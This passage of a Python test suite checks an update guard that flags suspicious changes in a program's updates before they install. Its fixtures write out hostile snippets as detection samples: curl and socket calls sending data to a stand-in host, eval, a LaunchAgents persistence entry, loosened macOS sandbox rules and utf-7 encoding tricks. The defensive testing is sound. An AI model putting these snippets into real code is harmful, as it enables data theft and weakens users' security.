        sandbox rules, the check rebuilt, a helper and two calls that go out changed. What asks: the check (one entry for
        all of it, however much changed in it), the helper, one entry per way out whose call changed and one for the filter
        of the internet search (in a chat you allowed, searches go without a click) -- the rest is one quiet line."""
        def swap(old, new):
            def change(b):
                self.assertEqual(b.count(old), 1, old)
                return b.replace(old, new)
            return change
        found = self.judged(
            web_search_py=lambda b: swap(b"_PLAIN_LEAST = 6 ", b"_PLAIN_LEAST = 5 ")(swap(b'GENERIC = {"bank", ', b'GENERIC = {"mustermann", "bank", ')(
                swap(b'_PERCENT = re.compile(r"%[0-9A-Fa-f]{2}")', b'_PERCENT = re.compile(r"%[0-9A-Fa-f]{1,2}")')(
                    swap(b'             "(deny file-write*)",', b'             "(deny file-write*)", "(deny iokit-open)",')(b)))),
            receipt_text_py=swap(b'        "(deny file-write*)",', b'        "(deny file-write*)", "(deny iokit-open)",'),
            update_guard_py=lambda b: swap(b'HARMLESS = frozenset("""__future__ abc ', b'HARMLESS = frozenset("""__future__ socket abc ')(b)
            + b"\n\ndef _later():\n    import subprocess\n    return subprocess.run(['git', 'log', 'https://example.org/x'])\n",
            updates_py=swap(b"MAX_TREE = 512 * 1024 * 1024 ", b"MAX_TREE = 256 * 1024 * 1024 "),
            auth_py=swap(b'"--args", reason, nonce], capture_output=True, timeout=95)', b'"--args", reason, nonce], capture_output=True, timeout=99)'),
            llm_local_py=swap(b'TMP_PREFIX = "llm-run-" ', b'TMP_PREFIX = "llm-tmp-" '),
            mac_app_swift=swap(b"private static let rowEnd: CGFloat = 46", b"private static let rowEnd: CGFloat = 48"))
        asks = entries(found)
        self.assertEqual(sorted(asks), ["check", "filter", "script:mac_app.swift", "way_program:llm_local.py", "way_program:open"], list(asks))
        self.assertEqual({x["level"] for x in asks["check"] + asks["script:mac_app.swift"]}, {"critical"})
        self.assertEqual({x["level"] for x in asks["way_program:open"] + asks["way_program:llm_local.py"] + asks["filter"]}, {"review"})
        self.assertEqual({x["where"] for x in asks["filter"]}, {"_PLAIN_LEAST", "GENERIC", "_PERCENT"})
        self.assertEqual(sorted({x["file"] for x in asks["check"]}), ["update_guard.py", "updates.py"])
        self.assertEqual({x["kind"] for x in asks["check"]}, {"guard"})                  # (what else the check holds: in its lines)
        self.assertTrue(any("socket" in x for f in asks["check"] for x in f.get("lines", [])))
        plain = {(f["file"], f["where"]) for f in found if f["level"] == "plain" and not f.get("dup")}
        self.assertTrue({("web_search.py", "reader_profile()"), ("receipt_text.py", "_profile()")} <= plain, plain)
        self.assertLess(len(json.dumps(found)), 64 * 1024)
        # and an update with only what is plain is installed without a word
        self.assertEqual(G.asking(self.judged(web_search_py=swap(b'             "(deny file-write*)",', b'             "(deny file-write*)", "(deny iokit-open)",'),
                                              receipt_text_py=swap(b'        "(deny file-write*)",', b'        "(deny file-write*)", "(deny iokit-open)",'))), [])

    def test_claude_asked_every_time_is_judged_like_a_table(self):
        """The sources asked on a card every time (Claude): one more is only stricter -- installed without asking; one less lets
        a question go out unasked -- critical. (Judged in the file alone: quick.)"""
        def swap(old, new):
            def change(b):
                self.assertEqual(b.count(old), 1, old)
                return b.replace(old, new)
            return change
        old = {"web_search.py": self.files["web_search.py"]}

        def judged(change):
            new = {"web_search.py": change(old["web_search.py"])}
            return G.compare(old, new)
        more = judged(swap(b'ASKED_ALWAYS = frozenset(("claude",))', b'ASKED_ALWAYS = frozenset(("claude", "tavily"))'))
        self.assertEqual([(f["kind"], f["where"], f["level"], f["topic"]) for f in more], [("rule", "ASKED_ALWAYS", "plain", "trust")])
        self.assertEqual(G.asking(more), [])
        fewer = judged(swap(b'ASKED_ALWAYS = frozenset(("claude",))', b"ASKED_ALWAYS = frozenset(())"))
        self.assertEqual([(f["kind"], f["where"], f["level"], f["topic"]) for f in G.asking(fewer)], [("rule", "ASKED_ALWAYS", "critical", "trust")])
        fewer = judged(swap(b'ANYWHERE = frozenset(("gdelt", "tavily", "claude"))', b'ANYWHERE = frozenset(("gdelt",))'))
        self.assertEqual([(f["where"], f["level"], f["topic"]) for f in G.asking(fewer)], [("ANYWHERE", "critical", "trust")])
        text = judged(swap(b"CLAUDE_TOKENS = 8192 ", b"CLAUDE_TOKENS = 64000 "))             # what the card shows whole: to review, with the filter
        self.assertEqual([(f["where"], f["level"], f["topic"]) for f in G.asking(text)], [("CLAUDE_TOKENS", "review", "filter")])
        where = judged(swap(b"CLAUDE_SECONDS = 300 ", b"CLAUDE_SECONDS = 3000 "))             # what the card does not show: a risk
        self.assertEqual([(f["where"], f["level"], f["topic"]) for f in G.asking(where)], [("CLAUDE_SECONDS", "critical", "reader")])

    def test_every_kind_is_shown(self):
        """Each kind of finding and each entry the check can name has its title and explanation on the update page, in both
        languages (a finding Kontor did not judge is titled by its kind); the page's rules are there."""
        app, texts = self.files["web/app.js"].decode("utf-8"), self.files["web/i18n.js"].decode("utf-8")
        cat = json.loads(texts[texts.index("{"):texts.rindex("}") + 1])
        kinds_on_page = re.search(r"const UP_KINDS = \{([^}]*)\}", app).group(1)
        keys = []
        for kind in G.KINDS:
            m = re.search(r"\b%s: \['(upd_t_\w+)', '(upd_w_\w+)'\]" % kind, kinds_on_page)
            self.assertTrue(m, kind)
            keys += [m.group(1), m.group(2)]
        keys += [k for pair in G.TOPIC_TEXT.values() for k in pair]
        for key in keys:
            self.assertIn(key, cat, key)
            de, en = cat[key]
            self.assertEqual(de.count("{0}"), en.count("{0}"), key)
        for topic in set(G.TOPIC_ORDER) | G.RULE_TOPICS:
            self.assertIn(topic, G.TOPIC_TEXT, topic)
        # every name of the rules, the page's rules and the words is judged, each by a policy the check knows
        for table in (G.RULES, G.PAGE_RULES):
            for rel, names in table.items():
                for name in names:
                    self.assertIn(name, G.RULE_LEVEL.get(rel, {}), "%s: %s has no level" % (rel, name))
        for rel in G.WORDS:
            self.assertIn(rel, G.RULES)
        self.assertEqual({p for v in G.RULE_LEVEL.values() for _t, p in v.values()} - {"risk", "card", "allow", "deny", "shield"}, set())
        # a table judged by its entries is written out in the program (else it is never plain)
        import ast
        for rel, names in G.RULE_LEVEL.items():
            for name, (_topic, policy) in names.items():
                if policy in ("allow", "deny"):
                    value = G._tops(ast.parse(self.files[rel].decode("utf-8")), name)
                    self.assertIsNotNone(value, name); G._literal(value)
                elif policy == "shield":
                    self.assertEqual(len(G._defs(ast.parse(self.files[rel].decode("utf-8")), name)), 1, name)
        for rel, names in G.PAGE_RULES.items():
            self.assertEqual(sorted(G._page_rules(rel, self.files[rel].decode("utf-8"))), sorted(names), rel)
        self.assertEqual(sorted(k[2] for k in self.scan[0] if k[0] == "rule" and k[1] == "web/app.js"), sorted(G.PAGE_RULES["web/app.js"]))

    def test_ordinary_changes_to_kontor(self):
        for name, files in (
                ("texts", {"web__i18n_js": lambda b: b.replace(b'"upd_geaendert":', b'"neu_x":["x", "y"],\n"upd_geaendert":')}),
                ("a page", {"web__app_js": b"\nfunction vNeu() { return `<div class=\"card\">${esc(t('neu'))}</div>`; }\n"}),
                ("arithmetic", {"tax_py": b"\n\ndef share(a, b):\n    return round(a * b / 100, 2)\n", "report_py": b"\nMORE = 'Summe'\n"}),
                ("a request handled", {"service_py": lambda b: b.replace(b'            if path == "/api/update/check":', b'            if path == "/api/new":\n                return self._json(200, {"ok": True})\n            if path == "/api/update/check":')}),
                ("what the assistant may be asked", {"assistant_py": b"\n\ndef more(x):\n    return [x]\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)


def entries(found) -> dict:
    """The entries of the update page that need approval: {topic: [findings]}, in their order."""
    out: dict = {}
    for f in G.asking(found):
        out.setdefault(f.get("topic") or f["kind"], []).append(f)
    return out


class Judged(unittest.TestCase):
    """What each finding means: what slips something in stays critical, what changes an existing way out is to be reviewed
    (one entry per way), what is only stricter or behind a card in the chat is plain -- installed without asking. Each with an
    explanation and the lines it concerns."""

    def found(self, **files):
        return G.compare(SMALL, changed(**files))

    def one(self, rel, change):
        """A file of Kontor alone, changed (its rules are kept per file: quick)."""
        with open(os.path.join(ROOT, rel), "rb") as f:
            old = f.read()
        new = change(old)
        self.assertNotEqual(new, old, rel)                        # (the place is there: the change is really made)
        return G.compare({rel: old}, {rel: new})

    def levels(self, found) -> set:
        return {f["level"] for f in found}

    def test_slipped_in_stays_critical(self):
        for name, files, topic in (
                ("a new host", {"work_py": b"\nWHERE = 'https://x.example/in'\n"}, "address:x.example"),
                ("a new host on a page", {"web__app_js": b"\nconst more = 'https://x.example/a';\n"}, "address:x.example"),
                ("subprocess in a new function", {"work_py": b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n"}, "new_program:curl"),
                ("the open starter of programs used from elsewhere", {"work_py": b"\nimport tools\n\n\ndef send(d):\n    tools.run('/usr/bin/curl', '-d', d, 'x')\n"}, "new_"),
                ("a new connection", {"work_py": b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n"}, "module:socket"),
                ("a .pth file", {"evil.pth": b"import os\n"}, "shadow:evil.pth"),
                ("the installer changed", {"updates_py": b"\nX = 1\n"}, "check"),
                ("the check: a harmless part more", {"update_guard_py": lambda b: b.replace(b"('json',)", b"('json', 'socket')")}, "check"),
                ("a detour", {"work_py": b"\n\ndef send(t):\n    return eval(t)\n"}, "detour:work.py"),
                ("writing into its own files", {"work_py": b"\n\ndef grow(t):\n    with open(os.path.join(os.path.dirname(__file__), 'fetch.py'), 'a') as f:\n        f.write(t)\n"}, "self:work.py"),
                ("a helper changed", {"helper_swift": b"let p = Process()\n"}, "script:helper.swift"),
                ("a file that cannot be read", {"fast_pyc": b"\x00\x01"}, "file:fast.pyc"),
                ("a start entry of macOS", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/Library/LaunchAgents/x.plist'), 1)\n"}, "place:LaunchAgents"),
                ("a page that leaves", {"web__app_js": b"\nfunction send(d) { location.href = u + d; }\n"}, "page:web/app.js")):
            with self.subTest(name):
                found = self.found(**files)
                asks = entries(found)
                self.assertTrue(any(t.startswith(topic) for t in asks), (name, list(asks)))
                for t, xs in asks.items():
                    if t.startswith(topic):
                        self.assertEqual({x["level"] for x in xs}, {"critical"}, name)
                        self.assertTrue(all(x["title"].startswith("upd_t_") and x["why"].startswith("upd_w_") for x in xs), name)

    def test_data_mixed_into_a_request_is_to_be_reviewed(self):
        """What goes out over a way there is already, put together differently: asked about, as one entry for that way --
        with the lines that changed (taken away and new)."""
        mixed = {"fetch_py": lambda b: b.replace(b"return urllib.request.urlopen(url, timeout=5).read()",
                                                 b"return urllib.request.urlopen(url + '?d=' + extra(), timeout=5).read()")
                 + b"\n\ndef extra():\n    return open('/tmp/x').read()\n"}
        found = self.found(**mixed)
        asks = entries(found)
        self.assertEqual(len(asks), 1, asks); xs = list(asks.values())[0]
        self.assertEqual({x["level"] for x in xs}, {"review"}); self.assertEqual({x["kind"] for x in xs}, {"call", "around"})
        call = [x for x in xs if x["kind"] == "call"][0]
        self.assertTrue(any(x.startswith("-") and "urlopen(url, timeout=5)" in x for x in call["lines"]), call["lines"])
        self.assertTrue(any(x.startswith("+") and "extra()" in x for x in call["lines"]), call["lines"])
        self.assertEqual(call["where"], "get"); self.assertEqual(call["file"], "fetch.py")
        around = [x for x in xs if x["kind"] == "around"][0]
        self.assertTrue(all(x.startswith("+") for x in around["lines"]), around)          # new: all its lines are new
        # the same call, new: a new way out -- critical
        new = self.found(work_py=b"\nimport urllib.request\n\n\ndef send(d):\n    return urllib.request.urlopen('https://api.example.org/v?d=' + d)\n")
        self.assertIn("critical", {x["level"] for x in G.asking(new) if x["kind"] == "call"})

    def test_sandbox_rules(self):
        """A profile of macOS' sandbox: a rule more that denies or one less that allows is stricter (plain); a rule more that
        allows, one less that denies, rules moved, a rule that is not one plain whole rule, or anything else of the function
        changed is critical."""
        llm = "llm_local.py"
        stricter = (("a rule more that denies", lambda b: b.replace(b'"(deny appleevent-send)", "(deny lsopen)",', b'"(deny appleevent-send)", "(deny lsopen)", "(deny iokit-open)",')),
                    ("a rule less that allows", lambda b: b.replace(b', "(allow file-read-metadata (vnode-type DIRECTORY))"])', b"])")),
                    ("a rule more with a pattern", lambda b: b.replace(b'"(deny signal)",', b'"(deny signal)", \'(deny file-write* (regex #"^/private/x/(a|b)"))\',')),
                    ("only its explanation", lambda b: b.replace(b'    """The rules for sandbox-exec (later rules win).', b'    """The rules for sandbox-exec (the last rule wins).')))
        for name, change in stricter:
            with self.subTest(name):
                found = self.one(llm, change)
                self.assertEqual(G.asking(found), [], (name, found))
                if name != "only its explanation":
                    self.assertIn("plain", self.levels(found)); self.assertIn("model_shield", {f["topic"] for f in found})
        looser = (("network allowed", lambda b: b.replace(b'"(deny network*)",', b'"(allow network*)",')),
                  ("a rule less that denies", lambda b: b.replace(b'"(deny appleevent-send)", ', b"")),
                  ("a rule more that allows", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(allow lsopen)",')),
                  ("a rule that denies and allows", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny iokit-open) (allow network*)",')),
                  ("a rule that hides the ones after it", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen) #|",')),
                  # the sandbox's language runs every part of a rule: a "deny" that defines or holds an allow is no plain rule
                  ("a rule that denies but redefines deny", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", \'(deny file-read-data (begin (define deny allow) (literal "/x")))\',')),
                  ("a rule that denies, an allow inside", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* ( allow default))",')),
                  ("a rule that denies with a modifier", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* (with no-report))",')),
                  # a second function of the same name, hidden from splitlines behind form feeds in comments: Python runs it
                  ("a second profile behind a form feed", lambda b: b + b'\n# \x0c_x = """\ndef sandbox_profile(*a, **k):\n    return "(version 1)\\n(allow default)\\n"\n# \x0c"""\n'),
                  ("a rule that denies, put together from values", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* (subpath %s))" % q("/x"),')),
                  ("rules moved", lambda b: b.replace(b'"(deny signal)", "(allow signal (target self))",', b'"(allow signal (target self))", "(deny signal)",')),
                  ("a rule more, and the strict level for another", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny iokit-open)",').replace(b'    if level == "strict":\n        rules +=', b'    if level == "x":\n        rules +=')))
        for name, change in looser:
            with self.subTest(name):
                found = self.one(llm, change)
                shield = [f for f in G.asking(found) if f["topic"] == "model_shield"]
                self.assertTrue(shield, (name, found)); self.assertEqual({f["level"] for f in shield}, {"critical"}, name)
                self.assertEqual(shield[0]["title"], "upd_t_model_shield")
                self.assertTrue(any(x[:1] in "+-" for f in shield for x in f.get("lines", [])), shield)
        # the receipt reader's profile is judged the same way, and the internet search's reader's
        for rel, old, new, plain in (("receipt_text.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(deny iokit-open)",', True),
                                     ("receipt_text.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(allow network-outbound)",', False),
                                     ("web_search.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(deny iokit-open)",', True),
                                     ("web_search.py", b'"(deny file-write*)",', b'"(allow file-write*)",', False)):
            with self.subTest(rel + (" stricter" if plain else " looser")):
                found = self.one(rel, lambda b: b.replace(old, new, 1))
                self.assertEqual(G.asking(found) == [], plain, found)

    def test_stricter_rules_and_rules_behind_a_card(self):
        """The internet search: a longer list of what is kept apart and a shorter list of what may be reached are plain; its
        filter against your own data is one entry to review either way (stricter or softer cannot be proven, and in a chat
        you allowed searches go without a click); more that may be reached, less kept apart, what goes without a card and what
        the reader sends unseen are critical."""
        ws = "web_search.py"
        plain = (("a longer list of shared domains", lambda b: b.replace(b'SHARED = {"github.io", ', b'SHARED = {"github.io", "example.net", ')),
                 ("a source less", lambda b: b.replace(b'    "wikidata": {"tier": 1, "hosts": ("www.wikidata.org",)},\n', b"")))
        for name, change in plain:
            with self.subTest(name):
                found = self.one(ws, change)
                self.assertTrue(found, name); self.assertEqual(G.asking(found), [], (name, found))
        review = (("a stricter filter", lambda b: b.replace(b"_PLAIN_LEAST = 6 ", b"_PLAIN_LEAST = 5 ")),
                  ("one more word that names nothing", lambda b: b.replace(b'GENERIC = {"bank", ', b'GENERIC = {"mustermann", "bank", ')),
                  ("the filter softened", lambda b: b.replace(b'            return "it contains an IBAN"\n', b"            pass\n")))
        for name, change in review:
            with self.subTest(name):
                found = G.asking(self.one(ws, change))
                self.assertTrue(found, name)
                self.assertEqual({(f["topic"], f["level"]) for f in found}, {("filter", "review")}, name)
                self.assertTrue(all(f.get("lines") for f in found), name)
        critical = (("a shorter list of shared domains", lambda b: b.replace(b'SHARED = {"github.io", ', b"SHARED = {"), "trust"),
                    ("a host more for a source", lambda b: b.replace(b'"hosts": ("www.wikidata.org",)}', b'"hosts": ("www.wikidata.org", "x.example")}'), "reader"),
                    ("a source of another tier", lambda b: b.replace(b'"wikidata": {"tier": 1,', b'"wikidata": {"tier": 3,'), "reader"),
                    ("any website trusted", lambda b: b.replace(b'    return bool(h) and any(h == x or h.endswith("." + x) for x in sites)', b"    return True"), "trust"),
                    ("a name for Kontor in every request", lambda b: b.replace(b'NEUTRAL_AGENT = "Mozilla/5.0 (compatible)"', b'NEUTRAL_AGENT = "Kontor"'), "reader"))
        for name, change, topic in critical:
            with self.subTest(name):
                found = [f for f in G.asking(self.one(ws, change)) if f["topic"] == topic]
                self.assertTrue(found, name); self.assertEqual({f["level"] for f in found}, {"critical"}, name)

    def test_a_table_changed_after_its_line(self):
        """A table proven only stricter must not change anywhere else: an entry set after its line, its type (run when the file
        loads), a line at the top that empties it or hands it on -- each asked about, and what it shows is the line itself."""
        ws = "web_search.py"
        at = b"\n\ndef _ace("
        for name, change, topic in (
                ("an entry set after the table", lambda b: b.replace(at, b'\nSOURCES["wikidata"] = {"tier": 1, "hosts": ("www.wikidata.org", "x.example")}' + at, 1), "reader"),
                ("a type that empties another table", lambda b: b.replace(b"_SECOND = {", b"_SECOND: SHARED.clear() or set = {", 1), "trust"),
                ("a line that empties the table", lambda b: b.replace(at, b"\nSHARED.clear()" + at, 1), "trust"),
                ("the table handed on", lambda b: b.replace(at, b"\n_S = SHARED" + at, 1), "trust")):
            with self.subTest(name):
                found = [f for f in G.asking(self.one(ws, change)) if f["topic"] == topic]
                self.assertTrue(found, name); self.assertEqual({f["level"] for f in found}, {"critical"}, name)
        lines = [x for f in G.asking(self.one(ws, lambda b: b.replace(at, b"\nSHARED.clear()" + at, 1))) for x in f.get("lines", [])]
        self.assertIn("+SHARED.clear()", lines)

    def two(self, changes):
        """Several files of Kontor, changed together."""
        old, new = {}, {}
        for rel, change in changes.items():
            with open(os.path.join(ROOT, rel), "rb") as f:
                old[rel] = f.read()
            new[rel] = change(old[rel])
            self.assertNotEqual(new[rel], old[rel], rel)
        return G.compare(old, new)

    def test_what_changes_a_rule_from_elsewhere(self):
        """A rule changed not where it is written: in a function, in a class or a default value run at import, through the
        file itself imported, from another file by the module or a name imported, through __dict__ -- each a finding that
        asks; and a file that says it is written in another encoding (utf-7 hides code in what reads as a comment) cannot be
        read here: asked about, too."""
        ws, at = "web_search.py", b"\n\ndef _ace("
        strip = b"def _strip(s: Any, n: int = SNIPPET) -> str:\n"
        for name, changes in (
                ("cleared in a function", {ws: lambda b: b.replace(strip, strip + b"    SHARED.clear()\n", 1)}),
                ("a host added in a function", {ws: lambda b: b.replace(strip, strip + b'    SOURCES["wikipedia"]["hosts"] += ("x.example",)\n', 1)}),
                ("cleared in a class at import", {ws: lambda b: b.replace(at, b"\nclass _C:\n    SHARED.clear()\n" + at, 1)}),
                ("cleared through the file itself", {ws: lambda b: b.replace(at, b"\nimport web_search as _me\n_me.SHARED.clear()\n" + at, 1)}),
                ("cleared from another file", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nweb_search.SHARED.clear()", 1)}),
                ("cleared through a name imported", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nfrom web_search import SHARED as _S\n_S.clear()", 1)}),
                ("a host added from another file", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b'\nimport web_search\nweb_search.SOURCES["wikipedia"]["hosts"] += ("x.example",)', 1)}),
                ("a profile replaced through __dict__", {"core.py": lambda b: b + b'\n\ndef _put(m, v):\n    m.__dict__["sandbox_profile"] = v\n'}),
                ("a stricter table, emptied elsewhere", {ws: lambda b: b.replace(b'SHARED = {"github.io", ', b'SHARED = {"github.io", "x.example", ', 1),
                                                         "assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nweb_search.SHARED.clear()", 1)}),
                ("built-in names redefined", {ws: lambda b: b.replace(b'SHARED = {"github.io", ', b'def frozenset(*a):\n    return set()\n\n\nSHARED = frozenset({"github.io", ', 1)
                                              .replace(b'"medium.com"}\n', b'"medium.com"})\n', 1)}),
                ("another encoding", {"access.py": lambda b: b"# -*- coding: utf-7 -*-\n" + b}),
                ("another encoding, second line", {"access.py": lambda b: b"#!/usr/bin/env python3\n# vim: set fileencoding=utf-7 :\n" + b})):
            with self.subTest(name):
                found = G.asking(self.two(changes))
                self.assertTrue(found, name)
                self.assertIn("critical", {f["level"] for f in found}, (name, found))

    def test_sandbox_texts_with_an_escaped_quote(self):
        """How the sandbox reads a quote after a backslash in #"..." cannot be told here: such a rule is never whole."""
        self.assertFalse(G._sb_whole('(deny file-read-data (literal #"A\\"))(begin (allow network-outbound)(define x\\"B"))'))
        self.assertFalse(G._sb_whole('(deny file-read-data (literal "a\\"b"))'))
        self.assertTrue(G._sb_whole('(deny file-write* (regex #"^/private/x/(a|b)"))'))
        self.assertTrue(G._sb_whole('(deny network-outbound (remote ip "localhost:*"))'))
        self.assertFalse(G._sb_whole("(deny file-read* (with no-report))"))

    def test_hidden_characters_are_shown(self):
        """Characters that turn a line around or hide in it (right-to-left marks, zero widths, form feeds) are shown by their
        number in the lines, never as they are."""
        found = self.found(work_py=b"\nimport urllib.request\n\n\ndef send(d):\n    return urllib.request.urlopen('https://api.example.org/?d=' + d)  # \xe2\x80\xae\xe2\x81\xa6 ok\n")
        lines = [x for f in found for x in f.get("lines", [])]
        self.assertTrue(any("\u27e8U+202E\u27e9" in x for x in lines), lines)
        self.assertFalse(any(c in x for x in lines for c in "\u202e\u2066\x0c"), lines)
        for c in "\u061c\u00ad\u3164\ufe0f\U000e0041\u180e":
            self.assertTrue(G._hidden(c), repr(c))
        self.assertFalse(any(G._hidden(c) for c in "aä€ \t→"))

    def test_lines_are_short_and_few(self):
        """The lines go with the settings: each finding at most LINES_MOST, each line at most LINE_WIDTH, all together at
        most LINES_ALL -- the rest is counted, not shown."""
        big = b"\nimport subprocess\n" + b"".join(b"\n\ndef send%d(d):\n%s    subprocess.run(['curl', d])\n" % (i, b"    x = 1\n" * 40) for i in range(30))
        found = self.found(work_py=big)
        shown = [x for f in found for x in f.get("lines", [])]
        self.assertLessEqual(len(shown), G.LINES_ALL); self.assertTrue(all(len(x) <= G.LINE_WIDTH for x in shown))
        self.assertTrue(all(len(f.get("lines", [])) <= G.LINES_MOST for f in found))
        self.assertTrue(any(f.get("more") for f in found))
        long = self.found(work_py=b"\n\ndef send(d):\n    return os.system('%s' + d)\n" % (b"x" * 400))
        self.assertTrue(all(len(x) <= G.LINE_WIDTH for f in long for x in f.get("lines", [])))


def archive(files: dict, base: str = "Kontor-main") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for rel, data in files.items():
            z.writestr(base + "/" + rel, data)
    return buf.getvalue()


class Install(unittest.TestCase):
    """An update from an archive: without findings installed as ever; with findings it waits -- nothing of it in the program
    folder -- until it is approved for exactly these files."""

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="kontor-guard-")
        self.prog = os.path.join(self.dir, "prog")
        for rel, data in SMALL.items():
            os.makedirs(os.path.dirname(os.path.join(self.prog, rel)), exist_ok=True)
            with open(os.path.join(self.prog, rel), "wb") as f:
                f.write(data)
        self.keep = (updates._get, updates.HERE)
        updates.HERE = self.prog

    def tearDown(self):
        updates._get, updates.HERE = self.keep
        shutil.rmtree(self.dir, ignore_errors=True)

    def install(self, files, **kw):
        updates._get = lambda url, accept="": archive(files)
        return updates.install("x/y", zip_url="https://codeload.github.com/x/y/zip/main", restart=False, **kw)

    def read(self, rel):
        with open(os.path.join(self.prog, rel), "rb") as f:
            return f.read()

    def test_without_findings_as_ever(self):
        new = changed(work_py=b"\n\ndef share(a, b):\n    return a * b\n", VERSION=lambda b: b"1.0.1\n")
        res = self.install(new)
        self.assertTrue(res["ok"], res); self.assertEqual(res["version"], "1.0.1"); self.assertNotIn("review", res)
        self.assertEqual(self.read("work.py"), new["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.1\n")

    def test_with_findings_it_waits(self):
        new = changed(work_py=b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n", VERSION=lambda b: b"1.0.1\n")
        res = self.install(new)
        self.assertFalse(res["ok"]); self.assertTrue(res["needs_approval"]); self.assertEqual(res["version"], "1.0.1")
        self.assertIn("module", kinds(res["review"]["findings"]))
        self.assertEqual(self.read("work.py"), SMALL["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.0\n")      # nothing of it is there
        # approved for other files (an older look, a guess): still waits
        for wrong in ("x", "0" * 64, G.digest(SMALL)):
            self.assertTrue(self.install(new, approved=wrong).get("needs_approval"), wrong)
        self.assertEqual(self.read("work.py"), SMALL["work.py"])
        # the files changed after you looked: waits again, with what they hold now
        later = changed(new, work_py=b"\nimport subprocess\n")
        again = self.install(later, approved=res["review"]["digest"])
        self.assertTrue(again.get("needs_approval")); self.assertNotEqual(again["review"]["digest"], res["review"]["digest"])
        self.assertEqual(self.read("work.py"), SMALL["work.py"])
        # approved for exactly these files: installed
        done = self.install(new, approved=res["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.read("work.py"), new["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.1\n")
        # and the version after it, without anything new, needs no approval
        self.assertTrue(self.install(changed(new, VERSION=lambda b: b"1.0.2\n"))["ok"])

    def test_only_what_is_plain_installs_without_asking(self):
        """An update whose findings are all plain (here: a table of the hosts that may be reached, judged by its entries) is
        installed as ever -- the settings name it in one quiet line; one more host waits for your approval."""
        keep = (G.RULES, G.RULE_LEVEL)
        G.RULES = dict(G.RULES, **{"fetch.py": ("ALLOWED",)})
        G.RULE_LEVEL = dict(G.RULE_LEVEL, **{"fetch.py": {"ALLOWED": ("reader", "allow")}})
        try:
            fewer = changed(fetch_py=lambda b: b.replace(b"ALLOWED = ('api.example.org',)", b"ALLOWED = ()"), VERSION=lambda b: b"1.0.1\n")
            updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(fewer)
            info = updates.check("x/y")
            self.assertTrue(info["review"]["findings"]); self.assertEqual(G.asking(info["review"]["findings"]), [])
            self.assertEqual({f["level"] for f in info["review"]["findings"]}, {"plain"})
            res = self.install(fewer)
            self.assertTrue(res["ok"], res); self.assertEqual(self.read("fetch.py"), fewer["fetch.py"])
            more = changed(fewer, fetch_py=lambda b: b.replace(b"ALLOWED = ()", b"ALLOWED = ('api.example.org', 'x.example')"), VERSION=lambda b: b"1.0.2\n")
            res = self.install(more)
            self.assertTrue(res.get("needs_approval"), res); self.assertEqual(self.read("fetch.py"), fewer["fetch.py"])
            self.assertIn("critical", {f["level"] for f in res["review"]["findings"]})
            self.assertTrue(self.install(more, approved=res["review"]["digest"])["ok"])
        finally:
            G.RULES, G.RULE_LEVEL = keep

    def test_only_what_was_read_is_installed(self):
        """What the archive holds beside the program -- other folders, hidden files, the tests -- never reaches the program
        folder; translated Python and files of unknown kind are findings."""
        new = changed(VERSION=lambda b: b"1.0.1\n")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for rel, data in new.items():
                z.writestr("Kontor-main/" + rel, data)
            z.writestr("Kontor-main/tests/evil.py", b"import socket\n")
            z.writestr("Kontor-main/.hidden.py", b"import socket\n")
            z.writestr("Kontor-main/.github/x.py", b"import socket\n")
            z.writestr("Other/evil.py", b"import socket\n")
            z.writestr("Kontor-main/../outside.py", b"import socket\n")
        updates._get = lambda url, accept="": buf.getvalue()
        res = updates.install("x/y", zip_url="https://codeload.github.com/x", restart=False)
        self.assertTrue(res["ok"], res)
        for gone in ("tests", ".hidden.py", ".github", "evil.py", os.path.join("..", "outside.py")):
            self.assertFalse(os.path.exists(os.path.join(self.prog, gone)), gone)
        res = self.install(changed(new, fast_pyc=b"\x00", VERSION=lambda b: b"1.0.2\n"))
        self.assertTrue(res.get("needs_approval")); self.assertEqual(kinds(res["review"]["findings"]), {"file"})
        self.assertFalse(os.path.exists(os.path.join(self.prog, "fast.pyc")))

    def test_the_daily_look_reads_the_new_version(self):
        new = changed(work_py=b"\nimport socket\n", VERSION=lambda b: b"1.0.1\n")
        updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(new)
        info = updates.check("x/y")
        self.assertTrue(info["newer"]); self.assertEqual(kinds(info["review"]["findings"]), {"module"})
        self.assertEqual(info["review"]["digest"], G.digest(new))
        clean = changed(VERSION=lambda b: b"1.0.1\n")
        updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(clean)
        self.assertEqual(updates.check("x/y")["review"]["findings"], [])
        def broken(url, accept=""):
            if url.endswith("/VERSION"):
                return b"1.0.1\n"
            raise OSError("offline")
        updates._get = broken
